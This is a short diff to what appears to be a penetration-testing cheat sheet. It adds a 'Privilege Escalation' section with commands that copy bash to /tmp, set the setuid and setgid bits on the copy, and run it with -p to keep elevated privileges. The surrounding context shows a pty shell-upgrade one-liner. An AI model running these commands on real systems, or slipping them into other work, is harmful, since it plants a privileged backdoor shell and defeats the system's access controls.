@@ -5,6 +5,7 @@
 - [File Enumeration](#file-enumeration)
 - [Gdbserver](#gdbserver)
 - [Port Forwarding](#port-forwarding)
+- [Privilege Escalation](#privilege-escalation)
 - [Reverse Shell](#reverse-shell)
 - [SCP](#scp)
 - [Sudo](#sudo)
@@ -55,6 +56,12 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
 *[source](https://github.com/acole76/pentestmonkey-cheatsheets/blob/master/shells.md)*
+
+## Privilege Escalation
+```
+/bin/cp /bin/bash /tmp/bash_up; /bin/chown user:group /tmp/bash_up; chmod g+s /tmp/bash_up; chmod u+s /tmp/bash_up
+/tmp/bash_up -p
+```
 
 ## SCP
 ### Download File
